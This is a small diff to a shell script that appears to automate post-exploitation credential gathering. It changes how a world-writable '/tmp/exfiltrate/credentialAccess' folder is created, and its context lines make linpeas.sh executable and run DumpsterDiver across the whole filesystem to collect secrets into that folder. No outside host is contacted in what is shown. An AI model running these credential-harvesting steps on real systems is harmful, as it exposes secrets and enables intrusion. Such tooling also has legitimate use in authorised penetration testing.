@@ -10,8 +10,7 @@
 /bin/bash -c 'chmod +x /tmp/linpeas.sh'
 
 #Create Exfiltration Folder
-mkdir -m 777 /tmp/exfiltrate
-mkdir -m 777 /tmp/exfiltrate/credentialAccess
+mkdir -m 777 -p /tmp/exfiltrate/credentialAccess
 
 #Dumpster Diver
 /bin/bash -c 'cd /tmp/DumpsterDiver-master; source "env/bin/activate"; python3 DumpsterDiver.py -p / -s -o /tmp/exfiltrate/credentialAccess/DumpsterDiver-$HOSTNAME.$(date +%Y%m%d).json &'
